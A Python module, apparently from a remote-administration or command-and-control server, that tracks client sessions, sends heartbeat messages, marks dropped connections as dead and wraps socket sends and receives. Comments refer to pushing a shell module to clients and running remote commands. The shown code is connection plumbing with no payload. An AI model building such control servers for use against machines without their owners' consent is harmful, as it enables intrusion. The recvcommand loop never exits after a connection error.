import time
import threading
import socket
from prettytable import PrettyTable


from .handler import Handler
from .sql import Sql
from .other import printColor
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SOCK_TIMEOUT


class Management(threading.Thread):
    is_life = "is_life?" 
    """
    Send is life.
    If the customer responds when he wants.
    if the client does not respond then an exception is declared and management puts inactive status (dead) via CheckConn
    """
    def __init__(self,timeout,ObjSql):
        threading.Thread.__init__(self)
        self.timeout = timeout #How long for each check connexion.
        self.ObjSql = ObjSql
 
    def run(self):
        
        while(True):
            
            time.sleep(self.timeout)
            for key in Handler.dict_conn.keys():
                #print(list(enumerate(Handler.dict_conn[0])))
                if(Handler.dict_conn[key][NB_ALIVE] ==True and Handler.dict_conn[key][NB_SOCKET] ==False):
                    print("\n\n\nChange value Is he alive true to false.")
                    Handler.dict_conn[key][NB_ALIVE] = False

                #print("TEST SOCK--->",bool(Handler.dict_conn[key][NB_SOCKET]))

                if(Handler.dict_conn[key][NB_ALIVE] and bool(Handler.dict_conn[key][NB_SOCKET])): #If the connection is alive (True) and the socket object is active (True)
                    try:
                        Handler.dict_conn[key][NB_SOCKET].send(Management.is_life.encode())
                        #print(Handler.dict_conn[key][8])

                    except ConnectionError as connerr: #If the connection does not answer
                        if(Handler.status_connection_display):
                            printColor("information","\n[-] The client's connection is disconnected.")
                            printColor("error",str(connerr))
                        else:
                            pass
                        CheckConn().connexionIsDead(key) #Change status to dead (False)

                else:#If the connection is dead
                    #print(key, "connexion is dead no send msg")
                    pass 

class CheckConn:
    #his class allows you to send and receive data on the network in complete security.
    
    def connexionIsDead(self, nb_session):
        #print(Handler.dict_conn[nb_session][3])
        Handler.dict_conn[nb_session][NB_ALIVE] = False
        Handler.dict_conn[nb_session][NB_SOCKET] = False
        Handler.dict_conn[nb_session][NB_PORT] = "---"
        #self.NewObjSql.updateValue("is_he_alive","False",nb_session,True) #Faut-il changer les valeurs de la db en temps reel ? Ou changer les valeurs lors de l'inialisation du script ?
        #self.NewObjSql.closeConn()
        

    def sendsafe(self, nb_session, sock, payload):
        '''
        Checks if the socket sending is not lost.
        Example: If the server sending MOD_SHELL is that at the moment the connection is cut then this function is really useful.
        If the server does not manage to contact the client then the connection is dead function is called.
        
        Returns true if the socket was sent if not retrun false if there was a problem.
        '''
        try:
            sock.send(payload)
        except ConnectionError as connerr: #If the connection does not answer
            if(Handler.status_connection_display):
                printColor("error","[-] The connection to the client was cut {}:{}.\n".format(Handler.dict_conn[nb_session][NB_IP],Handler.dict_conn[nb_session][NB_PORT]))
            self.connexionIsDead(nb_session)
            return False
        
        return True


    def recvall(self,sock,buffer):
    #Receives multiple data with timeout
        result =b""
        sock.settimeout(SOCK_TIMEOUT)
        
        while True:
            try:            
                data = sock.recv(buffer)
            except socket.timeout:
                result = b"ERRROR"
                break
            except ConnectionError as connerr:
                printColor("error", "[-] Error in recvall: {}".format(connerr))
                result = b"ERROR" #safe ?
                break
            else:
                if(data ==b"\r\n"):
                    break
                else:
                    result+=data
                
        sock.settimeout(None)
        return result
    
    def recvsafe(self,sock,buffer):
        
        result = b""
        sock.settimeout(SOCK_TIMEOUT)
        try:            
            result = sock.recv(buffer)
        except socket.timeout:
            printColor("error", "[-] timeout in recvsafe.")
            result = b"ERROR"
        except ConnectionError as connerr:
            printColor("error", "[-] error in recvsafe: {}".format(connerr))
            result = b"ERROR"
        finally:
            sock.settimeout(None)
            return result #empty return
    
    def recvcommand(self, sock, buffer):
        #Gets the data without delay (session "-c 'command' ")
        result = b""

        while True:
            try:
                data = sock.recv(buffer)
            except ConnectionError as connerr:
                printColor("error", "[-] error in recvsafe: {}".format(connerr))
                result = b"ERROR"
            else:
                if(data ==b"\r\n"):
                    break
                else:
                    result += data
        
        return result